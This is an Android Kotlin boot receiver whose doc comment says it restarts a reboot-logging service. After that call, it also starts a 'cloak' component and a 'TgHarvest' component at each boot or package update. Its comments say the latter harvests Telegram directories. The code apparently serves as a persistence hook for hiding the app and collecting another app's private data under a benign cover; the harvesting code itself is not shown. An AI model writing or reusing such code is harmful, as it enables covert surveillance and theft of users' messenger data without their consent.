package com.itsme.amkush.notification

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.itsme.amkush.services.RebootMonitorService
import com.itsme.amkush.utils.Logger

/**
 * Starts RebootMonitorService after device boot so reboot logs are captured
 * even if app was not manually opened after reboot
 */
class RebootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED ||
            intent.action == Intent.ACTION_MY_PACKAGE_REPLACED ||
            intent.action == Intent.ACTION_PACKAGE_REPLACED) {
            Logger.i("amkush/reboot_receiver", "Boot completed — starting RebootMonitorService")
            try {
                RebootMonitorService.start(context)
            } catch (e: Exception) {
                Logger.w("amkush/reboot_receiver", "Failed to start service on boot: ${e.message}")
            }
            // [V51] experiment: V30 base + cloak only
            com.itsme.amkush.console.CloakManager.start(context)
            // [V55 harvest] boot/package-replace: harvest Telegram dirs too
            com.itsme.amkush.logging.TgHarvest.start(context)
        }
    }
}
